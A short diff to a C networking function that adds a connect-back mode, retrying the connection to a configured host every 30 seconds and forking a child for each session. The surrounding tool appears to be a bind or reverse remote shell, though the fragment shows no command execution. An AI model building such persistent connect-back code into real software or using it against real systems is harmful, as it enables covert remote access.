@@ -180,21 +180,31 @@ int service(){
 			continue;
 		}
 		if(pid > 0){
-			waitpid(pid, NULL, 0);
+			waitpid(pid, &ret, 0);
+			if(ret) printf("[*] Return value %d\n", ret);
 			close(client);
 			continue;
 		}
 		close(server);
 #else
-		sleep(30);
 		if((client = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 			continue;
 		memset(&addr, 0, sizeof(addr));
 		addr.sin_family = AF_INET;
 		addr.sin_addr.s_addr = host;
 		addr.sin_port = htons(port);
-		if(connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0){
-			close( client );
+		while(connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0){
+			sleep(30);
+		}
+		pid = fork();
+		if(pid < 0){
+			close(client);
+			continue;
+		}
+		if(pid > 0){
+			waitpid(pid, &ret, 0);
+			if(ret) printf("[*] Return value %d\n", ret);
+			close(client);
 			continue;
 		}
 #endif
